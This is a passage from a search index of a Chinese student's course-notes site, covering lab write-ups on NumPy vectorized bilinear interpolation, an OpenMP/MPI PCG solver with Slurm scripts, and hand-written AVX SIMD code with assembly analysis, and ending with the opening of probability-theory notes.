\u4e2d\u53d6\u51fa\uff0c\u5e76\u4e14\u4f7f\u5f97\u5728\u8fdb\u884c\u77e9\u9635\u9010\u5143\u7d20\u4e58\u6cd5\u65f6\u80fd\u6ee1\u8db3\u5e7f\u64ad\u89c4\u5219\uff0c\u540c\u65f6\u5bf9 <code>C</code> \u4e2a\u901a\u9053\u7684\u4fe1\u606f\u8fdb\u884c\u5904\u7406\u3002</p>"},{"location":"labs/numpy/#step-2","title":"Step 2","text":"<p>\u73b0\u5728\u8003\u8651\u540c\u65f6\u5bf9 <code>N</code> \u5f20\u56fe\u7247\u8fdb\u884c\u5904\u7406\u3002</p> <p>\u5bf9 <code>vectorize1.py</code> \u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u4fee\u6539\u3002</p> <p>\u6211\u4eec\u8981\u5c06 <code>N</code> \u5f20\u56fe\u7247\u7684\u4fe1\u606f\u8fdb\u884c\u6574\u5408\u5904\u7406\uff0c\u4e00\u4e2a\u53ef\u884c\u7684\u65b9\u6cd5\u4e3a\u5728 <code>X, Y</code> \u7684\u57fa\u7840\u4e0a\u589e\u52a0\u4e00\u4e2a\u4ee3\u8868\u56fe\u7247\u7d22\u5f15\u7684\u8f74\uff0c\u4f7f\u5176\u5f62\u72b6\u4ece <code>(H2, W2)</code> \u53d8\u4e3a <code>(N, H2, W2)</code> \u3002\u5177\u4f53\u5b9e\u73b0\u5982\u4e0b\uff08 <code>X_idx, Y_idx, _X, _Y</code> \u7684\u83b7\u53d6\u4e00\u5e76\u7ed9\u51fa\uff09\uff1a</p> <pre><code>X, Y = b.transpose(3, 0, 1, 2)\nX_idx , Y_idx = np.floor(X).astype(int64), np.floor(Y).astype(int64)\n_X, _Y = X - X_idx, Y - Y_idx\n</code></pre> <p>\u540c\u7406\uff0c<code>A00, A01, A10, A11</code> \u5747\u9700\u8981\u589e\u52a0\u4e00\u4e2a\u8f74\uff0c\u4e8e\u662f\u65b0\u589e\u4e00\u4e2a\u7d22\u5f15\u6570\u7ec4 <code>N_idx</code> \u5bf9 <code>a</code> \u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u8f74 \uff08 <code>axis = 0</code> \uff09 \u8fdb\u884c\u7d22\u5f15\u3002\u5177\u4f53\u5b9e\u73b0\u5982\u4e0b\uff1a</p> <pre><code>N_idx = np.arange(N).reshape(N, 1, 1)\n\nA00 = a[N_idx, X_idx, Y_idx].transpose(3, 0, 1, 2)\nA01 = a[N_idx, X_idx, Y_idx + 1].transpose(3, 0, 1, 2)\nA10 = a[N_idx, X_idx + 1, Y_idx].transpose(3, 0, 1, 2)\nA11 = a[N_idx, X_idx + 1, Y_idx + 1].transpose(3, 0, 1, 2)\n</code></pre> <p>Note</p> <p><code>N_idx</code> \u7684\u5f62\u72b6\u4e0e <code>X_idx, Y_idx</code> \u5e76\u4e0d\u5339\u914d\uff0c\u4e4b\u6240\u4ee5\u80fd\u591f\u50cf\u8fd9\u6837\u5bf9 <code>a</code> \u6570\u7ec4\u8fdb\u884c fancy indexing \uff0c\u662f\u56e0\u4e3a\u8fdb\u884c\u7d22\u5f15\u7684\u65f6\u5019\u5bf9 <code>N_idx</code> \u7684\u540e\u4e24\u4e2a\u8f74\uff08 <code>axis=1, axis=2</code> \uff09\u8fdb\u884c\u4e86 broadcast \u3002</p> <p>\u5b8c\u6574\u4ee3\u7801\u5982\u4e0b\uff1a</p> vectorize.py<pre><code>def bilinear_interp_vectorized(a: np.ndarray, b: np.ndarray) -&gt; np.ndarray:\n    \"\"\"\n    This is the vectorized implementation of bilinear interpolation.\n    - a is a ND array with shape [N, H1, W1, C], dtype = int64\n    - b is a ND array with shape [N, H2, W2, 2], dtype = float64\n    - return a ND array with shape [N, H2, W2, C], dtype = int64\n    \"\"\"\n    # get axis size from ndarray shape\n    N, _, _, C = a.shape\n    N1, H2, W2, _ = b.shape\n    assets N == N1\n\n    # Do iteration\n    res = np.empty((N, H2, W2, C), dtype=int64)\n\n    # Get the matrices of coordinates\n    X, Y = b.transpose(3, 0, 1, 2)\n    X_idx , Y_idx = np.floor(X).astype(int64), np.floor(Y).astype(int64)\n    _X, _Y = X - X_idx, Y - Y_idx\n\n    # Generate the indices array\n    N_idx = np.arange(N).reshape(N, 1, 1)\n\n    A00 = a[N_idx, X_idx, Y_idx].transpose(3, 0, 1, 2)\n    A01 = a[N_idx, X_idx, Y_idx + 1].transpose(3, 0, 1, 2)\n    A10 = a[N_idx, X_idx + 1, Y_idx].transpose(3, 0, 1, 2)\n    A11 = a[N_idx, X_idx + 1, Y_idx + 1].transpose(3, 0, 1, 2)\n    res = A00 * (1 - _X) * (1 - _Y) + A01 * (1 - _X) * _Y + \\\n          A10 * _X * (1 - _Y) + A11 * _X * _Y\n    return res.transpose(1, 2, 3, 0).astype(int64)\n</code></pre>"},{"location":"labs/numpy/#_2","title":"\u6b63\u786e\u6027\u4e0e\u52a0\u901f\u6bd4","text":"<p>\u8fd0\u884c <code>main.py</code> \uff0c\u67e5\u770b\u8f93\u51fa\uff1a</p> <pre><code>Generating Data...\nExecuting Baseline Implementation...\nFinished in 99.58129525184631s\nExecuting Vectorized Implementation...\nFinished in 3.138871192932129s\n[PASSED] Results are identical.\nSpeed Up 31.725193272051396x\n</code></pre> <p>\u53ef\u89c1\u8fd0\u884c\u7ed3\u679c\u6b63\u786e\uff0c\u52a0\u901f\u6bd4\u4e3a 31.725193272051396 \u3002</p>"},{"location":"labs/numpy/#reference","title":"Reference","text":"<ul> <li>\u521d\u63a2Numpy\u4e2d\u7684\u82b1\u5f0f\u7d22\u5f15\uff1ahttps://zhuanlan.zhihu.com/p/123858781</li> <li>Numpy\u4e2dtranspose()\u51fd\u6570\u7684\u53ef\u89c6\u5316\u7406\u89e3\uff1ahttps://zhuanlan.zhihu.com/p/61203757</li> <li>NumPy \u4e2d\u6587\u6587\u6863\uff0c\u5e7f\u64ad\uff08Broadcasting\uff09\uff1ahttps://numpy.org.cn/user/basics/broadcasting.html</li> </ul>"},{"location":"labs/pcg/","title":"lab4 PCG Solver","text":""},{"location":"labs/pcg/#_1","title":"\u5b9e\u9a8c\u6b65\u9aa4","text":""},{"location":"labs/pcg/#_2","title":"\u8bbf\u5b58\u4f18\u5316","text":"<p>\u57fa\u51c6\u4ee3\u7801\u4e2d\uff0c\u4e0d\u8fde\u7eed\u7684\u5185\u5b58\u8bbf\u95ee\u5b58\u5728\u4e8e\u5bf9\u77e9\u9635 A \u5bf9\u89d2\u7ebf\u5143\u7d20\u7684\u8bbf\u95ee\u4e2d\uff0c\u901a\u8fc7\u5c06 A \u5bf9\u89d2\u7ebf\u5143\u7d20\u9884\u5148\u53d6\u51fa\u5b58\u653e\u5230\u8fde\u7eed\u7684\u5185\u5b58\u4e2d\uff0c\u63d0\u9ad8\u8bbf\u5b58\u6548\u7387\u3002</p>"},{"location":"labs/pcg/#openmp","title":"\u7ebf\u7a0b\u7ea7\u5e76\u884c\uff08OpenMP\uff09","text":"<p>\u4f7f\u7528 OpenMP \u5c06\u5faa\u73af\u5e76\u884c\u5316\u3002</p> <p>\u5bf9\u4e8e\u5faa\u73af\u4f53\u4e4b\u95f4\u65e0\u4f9d\u8d56\u7684\u8fed\u4ee3\uff0c\u5728\u5faa\u73af\u524d\u6dfb\u52a0\u5982\u4e0b\u6307\u4ee4\u4f7f\u5176\u5e76\u884c\u5316\uff1a</p> <pre><code>#pragma omp parallel for schedule(static)\n</code></pre> <p>\u5bf9\u4e8e\u8fdb\u884c\u7d2f\u52a0\u64cd\u4f5c\u7684\u8fed\u4ee3\uff0c\u4f7f\u7528\u5f52\u7ea6 (reduction) \u4f7f\u5176\u5e76\u884c\u5316\uff08\u5bf9 <code>sum</code> \u8fdb\u884c\u7d2f\u52a0\uff09\uff1a</p> <pre><code>#pragma omp parallel for reduction(+:sum) schedule(static)\n</code></pre> <p>\u5e76\u4e14\u4f7f\u7528 <code>static</code> \u8c03\u5ea6\u65b9\u5f0f\uff0c\u4f7f\u5404\u4e2a\u5757\u5305\u542b\u7684\u8fed\u4ee3\u6b21\u6570\u5e73\u5747\u3002</p>"},{"location":"labs/pcg/#mpi","title":"\u8fdb\u7a0b\u7ea7\u5e76\u884c\uff08MPI\uff09","text":"<p>\u4f7f\u7528 MPI \u5f00\u542f\u4e0d\u540c\u8fdb\u7a0b\u8fdb\u884c\u5e76\u884c\u8ba1\u7b97\u3002</p> <p>\u6574\u4f53\u601d\u8def\u4e3a\uff1a\u6839\u8fdb\u7a0b\u5728\u8ba1\u7b97\u5f00\u59cb\u524d\u5c06\u77e9\u9635 A \u548c\u6570\u7ec4 b \u5e7f\u64ad\u7ed9\u5404\u4e2a\u8fdb\u7a0b\uff0c\u5c06 <code>MatrixMulVec</code> \u51fd\u6570\u4e2d\u7684\u77e9\u9635\u4e0e\u5411\u91cf\u76f8\u4e58\u8fd0\u7b97\u5206\u53d1\u7ed9\u5404\u4e2a\u8fdb\u7a0b\u8fdb\u884c\u8ba1\u7b97\uff0c\u8ba1\u7b97\u5b8c\u6bd5\u4e4b\u540e\u5c06\u5404\u4e2a\u8fdb\u7a0b\u7ed3\u679c\u8fdb\u884c\u5408\u5e76\u5e76\u4e14\u5e7f\u64ad\uff0c\u5176\u4f59\u90e8\u5206\u5404\u4e2a\u8fdb\u7a0b\u72ec\u7acb\u8ba1\u7b97\u3002</p> <p>\u91c7\u7528\u4e0a\u8ff0\u65b9\u5f0f\uff0c\u5c3d\u91cf\u907f\u514d\u901a\u4fe1\u5e26\u6765\u8fc7\u5927\u7684\u5f00\u9500\uff0c\u5e76\u4e14\u5c3d\u91cf\u52a0\u901f\u65f6\u95f4\u6d88\u8017\u6700\u5927\u7684\u77e9\u9635\u4e0e\u5411\u91cf\u76f8\u4e58\u8fd0\u7b97\u3002</p> <p>\u6e90\u4ee3\u7801\u53ca <code>Makefile</code> \u6587\u4ef6\u4f4d\u4e8e\u5f53\u524d\u76ee\u5f55\u4e0b <code>pcg_c</code> \u6587\u4ef6\u5939\u5185\u3002</p> <p>Note</p> <p>\u5176\u4e2d <code>Makefile</code> \u6587\u4ef6\u8fdb\u884c\u4e86\u4e24\u5904\u66f4\u6539\uff1a</p> Makefile<pre><code>CC = mpiicc\nCFLAGS = -qopenmp -O3\n</code></pre> <p>\u4f7f\u7528 Intel \u63d0\u4f9b\u7684\u7f16\u8bd1\u5668 <code>mpiicc</code> \u3002</p> <p>\u6839\u636e\u5b98\u65b9\u6587\u6863\uff0c\u6dfb\u52a0 <code>-qopenmp</code> \u7f16\u8bd1\u9009\u9879\u542f\u7528 OpenMP \u3002</p> <p>\u4f7f\u7528 4 \u8282\u70b9 8 \u4efb\u52a1\u5bf9\u4e09\u7ec4\u8f93\u5165\u8fdb\u884c\u6d4b\u8bd5\uff0c\u4f7f\u7528 <code>sbatch</code> \u63d0\u4ea4\u5982\u4e0b\u811a\u672c\uff1a</p> job.sh<pre><code>#!/bin/bash\n#SBATCH -o out.txt\n#SBATCH -N 4\n#SBATCH -n 8\n#SBATCH --exclusive\n#SBATCH --cpus-per-task 12\nsource /opt/intel/oneapi/setvars.sh\nulimit -s unlimited\nmpirun ./pcg input_2.bin | grep -v 'mpool' | grep -v 'ib_md'\n</code></pre> <p>\u7ed3\u679c\u5206\u522b\u7528\u65f6 3.97 s \u300117.48 s\u300191.90 s \u3002</p>"},{"location":"labs/pcg/#profile","title":"Profile","text":"<p>\u4ee5\u8f93\u5165 <code>input_2.bin</code> \u4e3a\u4f8b\uff0c\u4f7f\u7528 <code>Intel Trace Analyzer and Collector</code> \u8fdb\u884c\u6027\u80fd\u5206\u6790\u3002</p> <p></p> <p>\u7531\u56fe\u53ef\u5f97\uff0c\u8017\u65f6\u6700\u591a\u7684\u4e09\u4e2a <code>MPI</code> \u51fd\u6570\u5206\u522b\u4e3a <code>MPI_Allgather</code> \u3001 <code>MPI_Bcast</code> \u3001 <code>MPI_Comm_rank</code> \u3002</p> <p></p> <p>\u53ef\u5f97\u7a0b\u5e8f\u6d88\u8017\u7684\u603b\u65f6\u95f4\u4e3a 103 s \uff0c\u5176\u4e2d\u6d88\u8017\u5728 <code>MPI</code> \u4e0a\u7684\u603b\u65f6\u95f4\u4e3a 37.9 s \u3002</p> <p>\u6253\u5f00\u4e8b\u4ef6\u65f6\u95f4\u8f74 (Event Timeline) \u53ef\u4ee5\u770b\u5230\u5404\u4e2a\u8fdb\u7a0b\u7684\u8fd0\u884c\u60c5\u51b5\uff1a</p> <p></p> <p>\u7531\u56fe\u53ef\u5f97\uff0c\u7a0b\u5e8f\u4e00\u5171\u5f00\u542f\u4e86 8 \u4e2a\u8fdb\u7a0b\uff0c\u8c03\u7528 <code>MPI</code> \u7684\u5f00\u9500\u4e3b\u8981\u7684\u4f4d\u4e8e\u6bcf\u6b21\u8fdb\u5165 <code>PCG</code> \u51fd\u6570\u65f6\u8c03\u7528 <code>MPI_Bcast</code> \u51fd\u6570\u3002</p> <p>\u622a\u53d6\u4e00\u5c0f\u6bb5\u65f6\u95f4\u8f74\u8fdb\u884c\u653e\u5927\uff0c\u53ef\u4ee5\u5f97\u77e5\u5728\u4e00\u6b21 <code>PCG</code> \u51fd\u6570\u7684\u8c03\u7528\u4e2d\uff0c<code>MPI_Allgather</code> \u51fd\u6570\u88ab\u8c03\u7528\u4e86\u591a\u6b21\uff1a</p> <p></p> <p>\u6b64\u5916\uff0c\u53f3\u952e\u4e0b\u65b9\u7684 <code>Group MPI</code> \u9009\u62e9 <code>Ungroup MPI</code> \uff0c\u53ef\u4ee5\u770b\u5230\u5404\u4e2a <code>MPI</code> \u51fd\u6570\u7684\u8c03\u7528\u6b21\u6570\u53ca\u65f6\u95f4\u6d88\u8017\uff1a</p> <p></p>"},{"location":"labs/pcg/#bonus","title":"Bonus","text":"<p>\u4f7f\u7528 Fortran \u5b8c\u6210\u5b9e\u9a8c\u3002</p> <p>\u6e90\u4ee3\u7801\u53ca <code>Makefile</code> \u6587\u4ef6\u4f4d\u4e8e\u5f53\u524d\u76ee\u5f55\u4e0b <code>pcg_fortran</code> \u6587\u4ef6\u5939\u5185\u3002</p> <p>Note</p> <p><code>Makefile</code> \u6587\u4ef6\u5982\u4e0b\uff1a</p> Makefile<pre><code>CC = mpiicc\nCF = mpiifort\nCFLAGS = -qopenmp -O3\n\n.PHONY = pcg\n\npcg: main.o judge.o pcg.o\n    $(CF) $(CFLAGS) $^ -o $@\n\njudge.o: judge.c judge.h\n    $(CC) $(CFLAGS) -c judge.c -o judge.o\n\nmain.o: main.f90\n    $(CF) $(CFLAGS) -c main.f90 -o main.o\n\npcg.o: pcg.f90\n    $(CF) $(CFLAGS) -c pcg.f90 -o pcg.o\n\nclean:\n    rm -f judge.o main.o pcg.o pcg\n</code></pre> <p>\u4f7f\u7528\u7684 Fortran \u7f16\u8bd1\u5668\u4e3a Intel \u63d0\u4f9b\u7684 <code>mpiifort</code> \u3002</p> <p>\u5c06 <code>pcg.f90</code> \u3001 <code>main.f90</code> \u3001 <code>judge.c</code> \u5206\u522b\u7f16\u8bd1\u6c47\u7f16\u4e3a <code>.o</code> \u6587\u4ef6\u540e\uff0c\u518d\u8fdb\u884c\u94fe\u63a5\u5f62\u6210\u53ef\u6267\u884c\u6587\u4ef6 <code>pcg</code> \u3002</p> <p>\u4ee5\u4f7f\u7528 4 \u8282\u70b9 8 \u4efb\u52a1\u5bf9\u4e09\u7ec4\u8f93\u5165\u8fdb\u884c\u6d4b\u8bd5\uff0c\u4f7f\u7528 <code>sbatch</code> \u63d0\u4ea4\u5982\u4e0b\u811a\u672c\uff1a</p> job.sh<pre><code>#!/bin/bash\n#SBATCH -o out.txt\n#SBATCH -N 4\n#SBATCH -n 8\n#SBATCH --exclusive\n#SBATCH --cpus-per-task 12\nsource /opt/intel/oneapi/setvars.sh\nulimit -s unlimited\nmpirun ./pcg input_2.bin | grep -v 'mpool' | grep -v 'ib_md'\n</code></pre> <p>\u4ee5 <code>input_2.bin</code> \u4e3a\u4f8b\uff0cFortran \u7528\u65f6 45.75 s \uff0cC \u7528\u65f6 17.48 s \u3002\uff08\u8fd8\u6ca1\u5f04\u6e05\u695a\u4e3a\u4ec0\u4e48\u76f8\u5dee\u8fd9\u4e48\u591a\uff09</p> <p>\u4f7f\u7528 C \u5b9e\u73b0\u53c2\u4e0e\u6392\u540d\u8ba1\u7b97\u5206\u6570\u3002</p>"},{"location":"labs/pcg/#reference","title":"Reference","text":"<ul> <li>MPI Tutorials</li> <li>Open MPI Documentation</li> <li>Get Started with Intel\u00ae Trace Analyzer and Collector</li> <li>Fortran \u5feb\u901f\u5165\u95e8\u6559\u7a0b</li> <li>Fortran \u7528\u6237\u6307\u5357</li> <li>Using OpenMP with Fortran</li> </ul>"},{"location":"labs/simd/","title":"lab2.5 \u624b\u5199 SIMD \u5411\u91cf\u5316","text":""},{"location":"labs/simd/#_1","title":"\u601d\u8def","text":"<p>\u9996\u5148\u5206\u6790\u9700\u8981\u5411\u91cf\u5316\u7684\u90e8\u5206\uff1a</p> <pre><code>for (int i = 0; i &lt; MAXN; ++i)\n{\n    c[i] += a[i] * b[i];\n}\n</code></pre> <p>\u53ef\u4ee5\u5206\u4e3a\u4e09\u4e2a\u90e8\u5206\uff1a</p> <ul> <li>\u9700\u8981\u8ba1\u7b97\u7684\u6570\u636e\uff1a <code>a[i], b[i], c[i]</code> \u3002</li> <li>\u8ba1\u7b97\u64cd\u4f5c\uff1a <code>tmp = a[i] * b[i]</code> \u548c <code>c[i] = c[i] + tmp</code> \u3002</li> </ul> <p>\u4e8e\u662f\u6839\u636e\u5411\u91cf\u5316\u7684\u57fa\u672c\u6d41\u7a0b\uff0c\u5927\u81f4\u9700\u8981\u51e0\u4e2a\u64cd\u4f5c\uff1a</p> <ul> <li>Load <code>a, b, c</code> \u5230 <code>__m256</code> \u7c7b\u578b\u53d8\u91cf <code>A, B, C</code> \u3002</li> <li>\u4ee4 <code>C = C + A * B</code> \u3002\uff08\u6b64\u5904\u8fd0\u7b97\u7b26\u53ea\u4ee3\u8868\u64cd\u4f5c\u7684\u542b\u4e49\uff09</li> <li>\u5c06 <code>C</code> \u7684\u6570\u636e\u5b58\u56de <code>float</code> \u6570\u7ec4 <code>c</code> \u4e2d \u3002</li> </ul> <p>\u5982\u4f55\u5b9e\u73b0\uff1f</p> <p>Load \u64cd\u4f5c\uff1a</p> <code>__m256 _mm256_loadu_ps (float const * mem_addr)</code> <p>\u4ece <code>mem_addr</code> \u6307\u5411\u7684\u5185\u5b58\u5730\u5740\u4e2d load 256 \u4f4d\uff088 \u4e2a <code>float</code> \u5143\u7d20\uff09\u7684\u6570\u636e\u5230\u5411\u91cf\u5bc4\u5b58\u5668\u3002</p> <p>\u8ba1\u7b97\u64cd\u4f5c\uff1a</p> <code>__m256 _mm256_mul_ps (__m256 a, __m256 b)</code> <p>\u8ba1\u7b97 <code>a</code> \u548c <code>b</code> \u4e2d <code>float</code> \u5143\u7d20\u9010\u4f4d\u76f8\u4e58\u7684\u7ed3\u679c\u3002</p> <code>__m256 _mm256_add_ps (__m256 a, __m256 b)</code> <p>\u8ba1\u7b97 <code>a</code> \u548c <code>b</code> \u4e2d <code>float</code> \u5143\u7d20\u9010\u4f4d\u76f8\u52a0\u7684\u7ed3\u679c\u3002</p> <p>Store \u64cd\u4f5c\uff1a</p> <code>void _mm256_storeu_ps (float * mem_addr, __m256 a)</code> <p>\u5c06 <code>a</code> \u4e2d\u7684 256 \u4f4d\uff088 \u4e2a <code>float</code> \u5143\u7d20\uff09\u7684\u6570\u636e store \u5230 <code>mem_addr</code> \u6307\u5411\u7684\u5185\u5b58\u5730\u5740\u4e2d\u3002</p> <p>\u4e8e\u662f\u5c31\u53ef\u4ee5\u5199\u51fa\u5411\u91cf\u5316\u7684\u4ee3\u7801\u4e86\uff1a</p> <pre><code>#define LEN (MAXN / 8)\nfor (int i = 0; i &lt; LEN; ++i) {\n    __m256 A, B, C;\n\n    // Load data\n    A = _mm256_loadu_ps(a + i * 8);\n    B = _mm256_loadu_ps(b + i * 8);\n    C = _mm256_loadu_ps(c + i * 8);\n\n    // Calculate\n    C = _mm256_add_ps(C, _mm256_mul_ps(A, B));\n\n    // Store data\n    _mm256_storeu_ps(c + i * 8, C);\n}\n</code></pre> <p>Note</p> <p>\u7531\u4e8e <code>__m256</code> \u7c7b\u578b\u53d8\u91cf\u53ea\u80fd\u540c\u65f6\u64cd\u4f5c 256 \u4f4d\u6570\u636e\uff0c\u5373 8 \u4e2a <code>float</code> \uff0c\u5411\u91cf\u5316\u65f6\u9700\u5bf9\u6bcf 8 \u4e2a\u6570\u636e\u8fdb\u884c\u4e00\u6b21\u5411\u91cf\u5316</p>"},{"location":"labs/simd/#_2","title":"\u6b63\u786e\u6027\u548c\u52a0\u901f\u6bd4","text":"<p>\u7f16\u8bd1\u8fd0\u884c <code>add.cpp</code> \uff0c\u7a0b\u5e8f\u8f93\u51fa\uff1a</p> <pre><code>time=1.916000\nCheck Passed\n</code></pre> <p>\u5411\u91cf\u5316\u540e\u8ba1\u7b97\u7ed3\u679c\u6b63\u786e\uff0c\u52a0\u901f\u6bd4\u4e3a 1.916 \u3002</p>"},{"location":"labs/simd/#_3","title":"\u6c47\u7f16\u4ee3\u7801\u5206\u6790","text":"<p>\u5229\u7528 godbolt \u8fdb\u884c\u6c47\u7f16\u4ee3\u7801\u5206\u6790\u3002</p> <p>\u5411\u91cf\u5316\u524d\uff0c\u9700\u8981\u5411\u91cf\u5316\u7684\u4ee3\u7801\u90e8\u5206\u7684\u6c47\u7f16\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>...\n        mov     DWORD PTR [rbp-20], 0\n        jmp     .L11\n.L12:\n        mov     eax, DWORD PTR [rbp-20]\n        cdqe\n        vmovss  xmm1, DWORD PTR c[0+rax*4]\n        mov     eax, DWORD PTR [rbp-20]\n        cdqe\n        vmovss  xmm2, DWORD PTR a[0+rax*4]\n        mov     eax, DWORD PTR [rbp-20]\n        cdqe\n        vmovss  xmm0, DWORD PTR b[0+rax*4]\n        vmulss  xmm0, xmm2, xmm0\n        vaddss  xmm0, xmm1, xmm0\n        mov     eax, DWORD PTR [rbp-20]\n        cdqe\n        vmovss  DWORD PTR c[0+rax*4], xmm0\n        add     DWORD PTR [rbp-20], 1\n.L11:\n        cmp     DWORD PTR [rbp-20], 99999999\n        jle     .L12\n...\n</code></pre> <p>\u53ef\u77e5\uff0c<code>for</code> \u5faa\u73af\u5185\u90e8\u7684\u4ee3\u7801\u88ab\u987a\u6b21\u6267\u884c\u4e86 <code>MAXN</code> \u6b21\uff0c\u6bcf\u6b21\u53ea\u5bf9 1 \u7ec4\u6570\u636e\uff08 <code>a[i], b[i], c[i]</code> \uff09 \u8fdb\u884c\u64cd\u4f5c\u3002</p> <p>\u5411\u91cf\u5316\u540e\uff0c\u88ab\u5411\u91cf\u5316\u7684\u4ee3\u7801\u90e8\u5206\u7684\u6c47\u7f16\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>...\n        mov     DWORD PTR [rbp-36], 0\n        jmp     .L11\n.L17:\n        mov     eax, DWORD PTR [rbp-36]\n        sal     eax, 3\n        cdqe\n        sal     rax, 2\n        add     rax, OFFSET FLAT:a\n        mov     QWORD PTR [rbp-392], rax\n        mov     rax, QWORD PTR [rbp-392]\n        vmovups ymm0, YMMWORD PTR [rax]\n        vmovaps YMMWORD PTR [rbp-112], ymm0\n        mov     eax, DWORD PTR [rbp-36]\n        sal     eax, 3\n        cdqe\n        sal     rax, 2\n        add     rax, OFFSET FLAT:b\n        mov     QWORD PTR [rbp-384], rax\n        mov     rax, QWORD PTR [rbp-384]\n        vmovups ymm0, YMMWORD PTR [rax]\n        vmovaps YMMWORD PTR [rbp-144], ymm0\n        mov     eax, DWORD PTR [rbp-36]\n        sal     eax, 3\n        cdqe\n        sal     rax, 2\n        add     rax, OFFSET FLAT:c\n        mov     QWORD PTR [rbp-376], rax\n        mov     rax, QWORD PTR [rbp-376]\n        vmovups ymm0, YMMWORD PTR [rax]\n        vmovaps YMMWORD PTR [rbp-176], ymm0\n        vmovaps ymm0, YMMWORD PTR [rbp-112]\n        vmovaps YMMWORD PTR [rbp-336], ymm0\n        vmovaps ymm0, YMMWORD PTR [rbp-144]\n        vmovaps YMMWORD PTR [rbp-368], ymm0\n        vmovaps ymm0, YMMWORD PTR [rbp-336]\n        vmulps  ymm0, ymm0, YMMWORD PTR [rbp-368]\n        vmovaps ymm1, YMMWORD PTR [rbp-176]\n        vmovaps YMMWORD PTR [rbp-272], ymm1\n        vmovaps YMMWORD PTR [rbp-304], ymm0\n        vmovaps ymm0, YMMWORD PTR [rbp-272]\n        vaddps  ymm0, ymm0, YMMWORD PTR [rbp-304]\n        vmovaps YMMWORD PTR [rbp-176], ymm0\n        mov     eax, DWORD PTR [rbp-36]\n        sal     eax, 3\n        cdqe\n        sal     rax, 2\n        add     rax, OFFSET FLAT:c\n        mov     QWORD PTR [rbp-184], rax\n        vmovaps ymm0, YMMWORD PTR [rbp-176]\n        vmovaps YMMWORD PTR [rbp-240], ymm0\n        vmovaps ymm0, YMMWORD PTR [rbp-240]\n        mov     rax, QWORD PTR [rbp-184]\n        vmovups YMMWORD PTR [rax], ymm0\n        nop\n        add     DWORD PTR [rbp-36], 1\n.L11:\n        cmp     DWORD PTR [rbp-36], 12499999\n        jle     .L17\n...\n</code></pre> <p>\u53ef\u77e5\u7a0b\u5e8f\u4f7f\u7528\u4e86 <code>vmoups</code> \u7b49\u6c47\u7f16\u6307\u4ee4\u548c 256 \u4f4d\u5bc4\u5b58\u5668 <code>ymm0, ymm1</code> \uff0c\u540c\u65f6\u5bf9 8 \u7ec4 <code>float</code> \u7c7b\u578b\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\uff0c\u5faa\u73af\u6b21\u6570\u51cf\u5c11\u5230 <code>MAXN / 8</code> \u6b21\u3002</p>"},{"location":"labs/simd/#reference","title":"Reference","text":"<ul> <li>Intel\u00ae Intrinsics Guide\uff1ahttps://www.intel.com/content/www/us/en/docs/intrinsics-guide/index.html</li> <li>n\u65b9\u8fc7\u767e\u4e07 \u66b4\u529b\u78be\u6807\u7b97\u2014\u2014\u6307\u4ee4\u96c6\u4f18\u5316\u7684\u57fa\u7840\u4f7f\u7528\uff1ahttps://www.luogu.com.cn/blog/ouuan/avx-optimize</li> <li>\u6c47\u7f16\u8bed\u8a00\u7b14\u8bb0\uff08\u516d\uff09\u2014\u2014SIMD\u6307\u4ee4\uff1ahttps://zhuanlan.zhihu.com/p/424475308</li> </ul>"},{"location":"math/","title":"Math","text":"<p>Info</p> <p>\u8fd9\u91cc\u662f\u4e0a\u8fc7\u7684\u4e00\u4e9b\u6570\u5b66\u8bfe\u7684\u7b14\u8bb0\u3002</p> <p>\u7531\u4e8e\u672c\u4eba\u662f\u6570\u5b66\u82e6\u624b\uff0c\u6240\u4ee5\u4ec5\u6709\u5fc5\u4fee\u7684\u6570\u5b66\u8bfe\u53ef\u80fd\u4f1a\u5199\u7b14\u8bb0\uff0c\uff08\u53ef\u80fd\u6709\u4e14\u53ea\u4f1a\u6709\u6982\u7387\u8bba\uff09\uff08\u6570\u5b66\u5206\u6790\u548c\u7ebf\u6027\u4ee3\u6570\u56db\u95e8\u8bfe\u5728\u54ea\u513f\u5462\uff1f\uff09\uff08\u662f\u554a\u600e\u4e48\u56de\u4e8b\u5462\uff0c\u8003\u8bd5\u5468\u4f60\u6709\u4ec0\u4e48\u5934\u7eea\u5417\uff09</p>"},{"location":"math/prob_theory/","title":"\u6982\u7387\u8bba","text":"<p>Info</p> <p>\u672c\u6587\u6863\u4e3a \u6982\u7387\u8bba\uff08H\uff09 \u7684\u5b66\u4e60\u7b14\u8bb0\uff0c\u6388\u8bfe\u6559\u5e08\u4e3a \u82cf\u4e2d\u6839 \u3002</p> <p>\u5927\u4f53\u6846\u67b6\u57fa\u672c\u662f\u7167\u7740\u82cf\u4e2d\u6839\u8001\u5e08\u7684\u6388\u8bfe\u987a\u5e8f\u5199\u7684\uff0c\u987a\u5e8f\u53ef\u80fd\u548c\u4e66\u4e0a\u4e0d\u4e00\u6837\u3002</p> <p>\u9664\u4e86\u8bfe\u4ef6\u91cc\u7684\u4e00\u4e9b\u5b9a\u4e49\u548c\u5b9a\u7406\uff0c\u6211\u8fd8\u8865\u5168\u4e86\u4e00\u4e9b\u5bf9\u4e8e\u6211\u6765\u8bf4\u4e0d\u592a\u80fd\u663e\u7136\u5f97\u5230\u7684\u8fc7\u7a0b\uff08\u5982\u679c\u89c9\u5f97\u6709\u4e9b\u5730\u65b9\u7684\u8fc7\u7a0b\u8fd8\u662f\u4e0d\u663e\u7136\uff0c\u6b22\u8fce\u8054\u7cfb\u6211\u8865\u5145\uff09\u3002</p>"},{"location":"math/prob_theory/chapter1/","title":"\u4e8b\u4ef6\u53ca\u5176\u6982\u7387","text":""},{"location":"math/prob_theory/chapter1/#_2","title":"\u968f\u673a\u4e8b\u4ef6\u548c\u6982\u7387","text":""},{"location":"math/prob_theory/chapter1/#_3","title":"\u968f\u673a\u73b0\u8c61","text":"<p>\u968f\u673a\u73b0\u8c61\uff1a\u786e\u5b9a\u6027\u73b0\u8c61\u3001\u968f\u673a\u73b0\u8c61\uff08\u4e0d\u786e\u5b9a\u6027\u73b0\u8c61\uff09\u3002</p> <p>\u968f\u673a\u73b0\u8c61\u57fa\u672c\u5c5e\u6027\uff1a</p> <ul> <li>\u53ef\u91cd\u590d\u8fdb\u884c\u6216\u91cd\u590d\u89c2\u5bdf\uff08\u5b9a\u6027\uff09</li> 